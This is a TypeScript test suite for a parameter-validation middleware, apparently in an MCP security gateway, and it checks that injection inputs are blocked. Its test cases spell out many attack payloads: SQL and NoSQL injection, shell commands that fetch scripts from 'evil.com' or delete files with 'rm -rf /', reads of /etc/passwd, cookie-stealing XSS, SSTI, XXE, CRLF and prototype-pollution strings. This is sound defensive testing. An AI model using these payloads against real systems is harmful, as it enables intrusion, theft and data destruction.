import { describe, it, expect } from 'vitest';
import { ParameterValidationMiddleware } from '../../security/parameter-validator';
import { createPipelineContext } from '../../pipeline/context';

function makeCtx(params: Record<string, unknown>) {
  return createPipelineContext({
    clientId: 'test', serverName: 'test', method: 'tools/call',
    request: { jsonrpc: '2.0', id: '1', method: 'tools/call', params: { name: 'test', arguments: params } },
  });
}

const mw = new ParameterValidationMiddleware({ enabled: true, maxStringLength: 1_000_000 });

// ─── SQL Injection ─────────────────────────────────────────────

describe('SQL Injection Detection', () => {
  const cases = [
    ['SELECT FROM WHERE', "SELECT * FROM users WHERE id = '1'"],
    ['DROP TABLE', 'DROP TABLE users'],
    ['DROP DATABASE', 'DROP DATABASE production'],
    ['DELETE FROM', 'DELETE FROM users WHERE 1=1'],
    ['INSERT INTO', "INSERT INTO users VALUES ('hacker')"],
    ['UPDATE ... SET', "UPDATE users SET role='admin'"],
    ['SQL comment escape', "'; --"],
    ['UNION SELECT', 'UNION SELECT username, password FROM users'],
    ['ALTER TABLE', 'ALTER TABLE users ADD COLUMN backdoor TEXT'],
    ['TRUNCATE TABLE', 'TRUNCATE TABLE audit_log'],
    ['EXEC stored procedure', 'EXEC sp_executesql N\'SELECT 1\''],
    ['SLEEP timing', "SLEEP(5) OR '1'='1'"],
  ];
  for (const [name, sql] of cases) {
    it(`blocks: ${name}`, async () => {
      const r = await mw.evaluate(makeCtx({ query: sql }));
      expect(r?.verdict).toBe('block');
      expect(r?.reason).toContain('SQL injection');
    });
  }
});

// ─── NoSQL Injection ───────────────────────────────────────────

describe('NoSQL Injection Detection', () => {
  it('blocks $where operator in value', async () => {
    const r = await mw.evaluate(makeCtx({ filter: '{"$where": "this.admin == true"}' }));
    expect(r?.verdict).toBe('block');
    expect(r?.reason).toContain('NoSQL');
  });
  it('blocks $regex operator in value', async () => {
    const r = await mw.evaluate(makeCtx({ search: '{"$regex": "^admin"}' }));
    expect(r?.verdict).toBe('block');
  });
  it('blocks $ne operator', async () => {
    const r = await mw.evaluate(makeCtx({ filter: '{"$ne": null}' }));
    expect(r?.verdict).toBe('block');
  });
  it('blocks $where with JavaScript', async () => {
    // Use actual object key form (stronger detection)
    const params: Record<string, unknown> = { $where: 'function(){return true}' };
    const r = await mw.evaluate(makeCtx(params));
    expect(r?.verdict).toBe('block');
  });
  it('blocks NoSQL operators as object keys', async () => {
    const params: Record<string, unknown> = { $gt: '', $regex: '.*' };
    const r = await mw.evaluate(makeCtx(params));
    expect(r?.verdict).toBe('block');
  });
  it('detects nested NoSQL operators in sub-objects', async () => {
    const r = await mw.evaluate(createPipelineContext({
      clientId: 'test', serverName: 'test', method: 'tools/call',
      request: { jsonrpc: '2.0', id: '2', method: 'tools/call',
        params: { name: 'test', arguments: { query: { $or: [{ name: { $regex: 'admin' } }] } } } },
    }));
    expect(r?.verdict).toBe('block');
  });
  it('blocks $nin operator in value', async () => {
    const r = await mw.evaluate(makeCtx({ token: '{"$nin": []}' }));
    expect(r?.verdict).toBe('block');
  });
  it('blocks $expr operator in value', async () => {
    const r = await mw.evaluate(makeCtx({ filter: '{"$expr": {"$eq": ["$role", "admin"]}}' }));
    expect(r?.verdict).toBe('block');
  });
  it('blocks $gt empty string bypass', async () => {
    const r = await mw.evaluate(makeCtx({ password: '{"$gt": ""}' }));
    expect(r?.verdict).toBe('block');
  });
  it('blocks Redis FLUSHALL', async () => {
    const r = await mw.evaluate(makeCtx({ cmd: 'FLUSHALL' }));
    expect(r?.verdict).toBe('block');
  });
  it('blocks MongoDB connection string', async () => {
    const r = await mw.evaluate(makeCtx({ uri: 'mongodb://hacker:pass@evil.com/admin' }));
    expect(r?.verdict).toBe('block');
  });
});

// ─── Command Injection ─────────────────────────────────────────

describe('Command Injection Detection', () => {
  const cases = [
    ['$(cmd)', '$(cat /etc/passwd)'],
    ['`cmd`', '`whoami`'],
    ['pipe to bash', 'data | bash'],
    ['pipe to python', 'input | python'],
    ['pipe to powershell', 'script | powershell'],
    ['chained rm', 'ls && rm -rf /'],
    ['chained curl', 'ping && curl http://evil.com/backdoor.sh'],
    ['chained wget', 'test && wget http://malware.com/payload'],
    ['|| shutdown', 'false || shutdown -h now'],
    ['; rm -rf', 'id; rm -rf /home/user'],
    ['dd of=/dev', 'echo data | dd of=/dev/sda'],
    ['sudo rm', 'sudo rm -rf /var/log'],
    ['/etc/passwd', 'cat /etc/passwd'],
    ['/etc/shadow', 'get /etc/shadow'],
    ['/etc/sudoers', 'echo ok >> /etc/sudoers'],
    ['redirect /dev', '> /dev/sda data'],
    ['chmod 777', 'chmod 777 /bin/sh'],
    ['Python os.system', 'os.system("rm -rf /")'],
    ['Python os.popen', 'os.popen("whoami")'],
    ['Python subprocess', 'subprocess.call(["cat", "/etc/passwd"])'],
    ['Java Runtime.exec', 'Runtime.getRuntime().exec("cat /etc/passwd")'],
    ['Java ProcessBuilder', 'ProcessBuilder(["/bin/bash", "-c", "id"])'],
  ];
  for (const [name, cmd] of cases) {
    it(`blocks: ${name}`, async () => {
      const r = await mw.evaluate(makeCtx({ cmd }));
      expect(r?.verdict).toBe('block');
      expect(r?.reason).toContain('Command injection');
    });
  }
});

// ─── XSS ────────────────────────────────────────────────────────

describe('XSS Detection', () => {
  const cases = [
    ['<script> tag', '<script>alert(1)</script>'],
    ['<script src>', '<script src="http://evil.com/xss.js">'],
    ['onerror', '<img src=x onerror="alert(document.cookie)">'],
    ['onload', '<body onload="alert(1)">'],
    ['javascript: URI', 'javascript:alert(1)'],
    ['data:text/html', 'data:text/html,<script>alert(1)</script>'],
    ['document.cookie', "document.cookie='session=stolen'"],
    ['innerHTML', 'el.innerHTML = "<img src=x onerror=alert(1)>"'],
    ['eval()', 'eval("alert(1)")'],
    ['<iframe>', '<iframe src="javascript:alert(1)">'],
    ['<object>', '<object data="javascript:alert(1)">'],
    ['<embed>', '<embed src="http://evil.com/exploit.swf">'],
    ['SVG onload', '<svg onload="alert(1)">'],
    ['CSS expression', 'expression(alert(1))'],
    ['CSS url() JS', 'url("javascript:alert(1)")'],
  ];
  for (const [name, payload] of cases) {
    it(`blocks: ${name}`, async () => {
      const r = await mw.evaluate(makeCtx({ content: payload }));
      expect(r?.verdict).toBe('block');
      expect(r?.reason).toContain('XSS');
    });
  }
});

// ─── SSTI ───────────────────────────────────────────────────────

describe('SSTI Detection', () => {
  // SSTI-specific patterns (Jinja2 dunder traversal, etc.)
  const sstiCases = [
    ['Jinja2 __class__', '{{ config.__class__.__init__.__globals__ }}'],
    ['Jinja2 __mro__', '{{ "".__class__.__mro__[1].__subclasses__() }}'],
    ['Jinja2 __globals__', "{{ self.__init__.__globals__['os'] }}"],
    ['Jinja2 lipsum', '{{ lipsum.__globals__["os"].popen("id").read() }}'],
    ['Jinja2 {% import %}', '{% import os %}'],
    ['Smarty {php}', '{php}echo shell_exec("id");{/php}'],
    ["Python MRO chain", "''.__class__.__mro__[2].__subclasses__()"],
  ];
  for (const [name, tpl] of sstiCases) {
    it(`blocks SSTI: ${name}`, async () => {
      const r = await mw.evaluate(makeCtx({ template: tpl }));
      expect(r?.verdict).toBe('block');
    });
  }
  // System/exec calls via SSTI syntax — these are detected by command injection
  it('detects system() in Jinja2 context as command injection', async () => {
    const r = await mw.evaluate(makeCtx({ template: '{{ system("cat /etc/passwd") }}' }));
    // Falls through SSTI patterns, caught by command injection (/etc/passwd)
    expect(r?.verdict).toBe('block');
  });
  it('detects file_get_contents in Twig context as injection', async () => {
    const r = await mw.evaluate(makeCtx({ template: "{{ file_get_contents('/etc/passwd') }}" }));
    expect(r?.verdict).toBe('block');
  });
  it('detects FreeMarker class access pattern', async () => {
    // FreeMarker getClass pattern: ${...getClass()...}
    const r = await mw.evaluate(makeCtx({ template: '${product.getClass().getProtectionDomain()}' }));
    expect(r?.verdict).toBe('block');
  });
  it('detects Velocity evaluate directive', async () => {
    const r = await mw.evaluate(makeCtx({ template: '#evaluate("java.lang.Runtime.getRuntime().exec(\'id\')")' }));
    expect(r?.verdict).toBe('block');
  });
});

// ─── LDAP Injection ─────────────────────────────────────────────

describe('LDAP Injection Detection', () => {
  it('blocks LDAP OR filter', async () => {
    const r = await mw.evaluate(makeCtx({ filter: '(|(uid=admin)(&(uid=*)(userPassword=*)))' }));
    expect(r?.verdict).toBe('block');
  });
  it('blocks LDAP wildcard injection', async () => {
    const r = await mw.evaluate(makeCtx({ filter: '(uid=admin*)' }));
    expect(r?.verdict).toBe('block');
  });
  it('blocks LDAP NOT operator', async () => {
    const r = await mw.evaluate(makeCtx({ filter: '(!(uid=admin))' }));
    expect(r?.verdict).toBe('block');
  });
  it('blocks LDAP nested OR', async () => {
    const r = await mw.evaluate(makeCtx({ filter: '(|(uid=admin)(|(cn=*)(sn=*)))' }));
    expect(r?.verdict).toBe('block');
  });
  it('blocks userPassword attribute', async () => {
    const r = await mw.evaluate(makeCtx({ filter: '(userPassword=secret)' }));
    expect(r?.verdict).toBe('block');
  });
});

// ─── XXE ────────────────────────────────────────────────────────

describe('XXE Detection', () => {
  it('blocks DOCTYPE entity declaration', async () => {
    // Uses file:// URL — may be caught by command injection or XXE, both valid
    const r = await mw.evaluate(makeCtx({ xml: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>' }));
    expect(r?.verdict).toBe('block');
  });
  it('blocks external entity with SYSTEM', async () => {
    const r = await mw.evaluate(makeCtx({ xml: '<!ENTITY evil SYSTEM "http://evil.com/evil.dtd">' }));
    expect(r?.verdict).toBe('block');
  });
  it('blocks parameter entity', async () => {
    const r = await mw.evaluate(makeCtx({ xml: '<!ENTITY % xxe; SYSTEM "http://evil.com">' }));
    expect(r?.verdict).toBe('block');
  });
  it('blocks billion laughs expansion', async () => {
    // 3+ entity declarations triggers the pattern
    const r = await mw.evaluate(makeCtx({ xml: '<!DOCTYPE x [<!ENTITY a "a"><!ENTITY b "b"><!ENTITY c "c">]>' }));
    expect(r?.verdict).toBe('block');
  });
  it('blocks XSLT injection', async () => {
    const r = await mw.evaluate(makeCtx({ xml: '<xsl:stylesheet version="1.0">' }));
    expect(r?.verdict).toBe('block');
  });
  it('blocks XInclude attack', async () => {
    const r = await mw.evaluate(makeCtx({ xml: '<xi:include href="file:///etc/passwd" parse="text"/>' }));
    expect(r?.verdict).toBe('block');
  });
});

// ─── CRLF / Header Injection ────────────────────────────────────

describe('CRLF / Header Injection Detection', () => {
  it('blocks literal CRLF in value', async () => {
    const r = await mw.evaluate(makeCtx({ url: 'http://x.com\r\nSet-Cookie: stolen=yes' }));
    expect(r?.verdict).toBe('block');
  });
  it('blocks URL-encoded CRLF', async () => {
    const r = await mw.evaluate(makeCtx({ redirect: 'http://x.com%0d%0aContent-Type:text/html' }));
    expect(r?.verdict).toBe('block');
  });
  it('blocks URL-encoded LF', async () => {
    const r = await mw.evaluate(makeCtx({ header: 'val%0aX-Injected: true' }));
    expect(r?.verdict).toBe('block');
  });
  it('blocks Content-Type header injection', async () => {
    const r = await mw.evaluate(makeCtx({ body: 'ok\r\nContent-Type: text/html\r\n\r\n<script>alert(1)</script>' }));
    expect(r?.verdict).toBe('block');
  });
  it('blocks HTTP header smuggling', async () => {
    const r = await mw.evaluate(makeCtx({ data: 'value\nHost: evil.com' }));
    expect(r?.verdict).toBe('block');
  });
});

// ─── Prototype Pollution ────────────────────────────────────────

describe('Prototype Pollution Detection', () => {
  it('blocks __proto__ key (JSON-parsed)', async () => {
    const params = JSON.parse('{"__proto__":{"admin":true}}');
    const r = await mw.evaluate(makeCtx(params));
    expect(r?.verdict).toBe('block');
  });
  it('blocks constructor key', async () => {
    const r = await mw.evaluate(makeCtx({ constructor: { prototype: { admin: true } } }));
    expect(r?.verdict).toBe('block');
  });
  it('blocks __defineGetter__', async () => {
    const r = await mw.evaluate(makeCtx({ '__defineGetter__': 'polluted' }));
    expect(r?.verdict).toBe('block');
  });
  it('detects __proto__ in JSON string (raw value check)', async () => {
    const r = await mw.evaluate(makeCtx({ config: '{"__proto__": {"isAdmin": true}}' }));
    expect(r?.verdict).toBe('block');
  });
  it('detects nested __proto__ from JSON', async () => {
    const params = JSON.parse('{"nested":{"deep":{"__proto__":{"isAdmin":"true"}}}}');
    const r = await mw.evaluate(makeCtx(params));
    expect(r?.verdict).toBe('block');
  });
});

// ─── ReDoS ──────────────────────────────────────────────────────

describe('ReDoS Detection', () => {
  it('warns on (a+)+ pattern', async () => {
    const r = await mw.evaluate(makeCtx({ pattern: '(a+)+b' }));
    expect(r?.verdict).toBe('warn');
    expect(r?.reason).toContain('ReDoS');
  });
  it('warns on ([chars]+)* pattern', async () => {
    const r = await mw.evaluate(makeCtx({ filter: '([a-z]+)*b' }));
    expect(r?.verdict).toBe('warn');
  });
  it('warns on group with high repetition bound', async () => {
    const r = await mw.evaluate(makeCtx({ regex: '(a+){100,}' }));
    expect(r?.verdict).toBe('warn');
  });
  it('does NOT flag normal text', async () => {
    const r = await mw.evaluate(makeCtx({ prompt: 'hello world, this is normal text' }));
    expect(r).toBeNull();
  });
  it('does NOT flag valid email regex', async () => {
    const r = await mw.evaluate(makeCtx({ pattern: '[a-zA-Z0-9]+@[a-z]+\\.[a-z]{2,}' }));
    expect(r).toBeNull();
  });
});

// ─── False Positive Prevention ──────────────────────────────────

describe('False Positive Prevention', () => {
  it('passes normal file path', async () => {
    expect(await mw.evaluate(makeCtx({ path: '/tmp/test.txt' }))).toBeNull();
  });
  it('passes normal JSON data', async () => {
    expect(await mw.evaluate(makeCtx({ data: { name: 'John', age: 30 } }))).toBeNull();
  });
  it('passes normal MCP tool arguments', async () => {
    expect(await mw.evaluate(makeCtx({ filePath: '/home/user/doc.txt', encoding: 'utf-8', maxLines: 100 }))).toBeNull();
  });
  it('passes code snippet without injection', async () => {
    expect(await mw.evaluate(makeCtx({ code: 'function add(a, b) { return a + b; }' }))).toBeNull();
  });
});
